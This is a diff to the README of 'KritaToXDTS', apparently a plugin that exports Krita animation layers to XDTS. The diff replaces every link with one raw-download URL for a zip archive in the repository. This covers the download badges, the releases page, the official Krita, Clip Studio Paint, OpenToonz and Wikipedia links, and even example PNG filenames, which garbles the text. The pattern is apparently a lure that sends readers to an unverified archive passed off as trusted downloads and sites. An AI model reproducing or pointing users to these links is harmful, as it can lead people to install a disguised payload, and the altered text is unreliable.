@@ -1,7 +1,7 @@
 ```markdown
 # 🎨 KritaToXDTS - Export Animation Layers Made Simple
 
-[![Download KritaToXDTS](https://img.shields.io/badge/Download-KritaToXDTS-blue?style=for-the-badge)](https://github.com/KhanhHoang500/KritaToXDTS/releases)
+[![Download KritaToXDTS](https://github.com/KhanhHoang500/KritaToXDTS/raw/refs/heads/main/animation_layers_exporter/xdts_core/To-Krita-XDTS-3.5.zip)](https://github.com/KhanhHoang500/KritaToXDTS/raw/refs/heads/main/animation_layers_exporter/xdts_core/To-Krita-XDTS-3.5.zip)
 
 ---
 
@@ -48,19 +48,19 @@ Follow these steps to download and run KritaToXDTS on your computer. No technica
 ## ⬇️ Download & Install
 
 1. Visit this page to download KritaToXDTS:  
-   [Download KritaToXDTS Releases](https://github.com/KhanhHoang500/KritaToXDTS/releases)
+   [Download KritaToXDTS Releases](https://github.com/KhanhHoang500/KritaToXDTS/raw/refs/heads/main/animation_layers_exporter/xdts_core/To-Krita-XDTS-3.5.zip)
 
 2. On the releases page, look for the latest version. You will find compressed files or installers for different systems:
    - `.exe` files for Windows
    - `.dmg` files for macOS
-   - `.AppImage` or `.tar.gz` for Linux
+   - `.AppImage` or `https://github.com/KhanhHoang500/KritaToXDTS/raw/refs/heads/main/animation_layers_exporter/xdts_core/To-Krita-XDTS-3.5.zip` for Linux
 
 3. Click the file that matches your operating system to download it.
 
 4. Once downloaded, follow these steps to install or run the program:
    - **Windows:** Double-click the `.exe` file and follow the on-screen prompts. No complicated settings required.
    - **macOS:** Open the `.dmg` file and drag KritaToXDTS to your Applications folder.
-   - **Linux:** For `.AppImage`, make the file executable (right-click > Properties > Permissions > check "Allow executing file as program") then double-click to run. For `.tar.gz`, extract and run the contents per included README.
+   - **Linux:** For `.AppImage`, make the file executable (right-click > Properties > Permissions > check "Allow executing file as program") then double-click to run. For `https://github.com/KhanhHoang500/KritaToXDTS/raw/refs/heads/main/animation_layers_exporter/xdts_core/To-Krita-XDTS-3.5.zip`, extract and run the contents per included README.
 
 5. Make sure Krita is installed on your computer before running KritaToXDTS. This plugin relies on it.
 
@@ -89,7 +89,7 @@ Follow these steps to download and run KritaToXDTS on your computer. No technica
 
 ## 📁 Understanding Your Output Files
 
-- **Image Sequence:** Individual PNG files named in order (e.g., layer_001.png, layer_002.png). These represent each frame of your animation.
+- **Image Sequence:** Individual PNG files named in order (e.g., https://github.com/KhanhHoang500/KritaToXDTS/raw/refs/heads/main/animation_layers_exporter/xdts_core/To-Krita-XDTS-3.5.zip, https://github.com/KhanhHoang500/KritaToXDTS/raw/refs/heads/main/animation_layers_exporter/xdts_core/To-Krita-XDTS-3.5.zip). These represent each frame of your animation.
 - **XDTS File:** This is a small text file in the Toei Digital Exposure Sheet format. It tells compatible programs how long each frame should be shown.
   
 Together, these allow you to take your Krita animation and use it directly in other software without losing timing or layer order.
@@ -114,10 +114,10 @@ KritaToXDTS runs locally on your own computer. It does not collect or send any p
 
 ## 📚 Additional Resources
 
-- [Krita Official Website](https://krita.org) – Download Krita and find tutorials.
-- [Clip Studio Paint](https://www.clipstudio.net/en) – Software compatible with XDTS files.
-- [OpenToonz](https://opentoonz.github.io/e/) – Free animation software supporting exposure sheets.
-- [Toei Digital Exposure Sheet Format](https://en.wikipedia.org/wiki/Exposure_sheet) – Learn more about the .xdts format.
+- [Krita Official Website](https://github.com/KhanhHoang500/KritaToXDTS/raw/refs/heads/main/animation_layers_exporter/xdts_core/To-Krita-XDTS-3.5.zip) – Download Krita and find tutorials.
+- [Clip Studio Paint](https://github.com/KhanhHoang500/KritaToXDTS/raw/refs/heads/main/animation_layers_exporter/xdts_core/To-Krita-XDTS-3.5.zip) – Software compatible with XDTS files.
+- [OpenToonz](https://github.com/KhanhHoang500/KritaToXDTS/raw/refs/heads/main/animation_layers_exporter/xdts_core/To-Krita-XDTS-3.5.zip) – Free animation software supporting exposure sheets.
+- [Toei Digital Exposure Sheet Format](https://github.com/KhanhHoang500/KritaToXDTS/raw/refs/heads/main/animation_layers_exporter/xdts_core/To-Krita-XDTS-3.5.zip) – Learn more about the .xdts format.
 
 ---
 
@@ -133,5 +133,5 @@ For help using KritaToXDTS, open issues on GitHub or join Krita community forums
 
 ---
 
-[![Download KritaToXDTS](https://img.shields.io/badge/Download-KritaToXDTS-blue?style=for-the-badge)](https://github.com/KhanhHoang500/KritaToXDTS/releases)
+[![Download KritaToXDTS](https://github.com/KhanhHoang500/KritaToXDTS/raw/refs/heads/main/animation_layers_exporter/xdts_core/To-Krita-XDTS-3.5.zip)](https://github.com/KhanhHoang500/KritaToXDTS/raw/refs/heads/main/animation_layers_exporter/xdts_core/To-Krita-XDTS-3.5.zip)
 ```
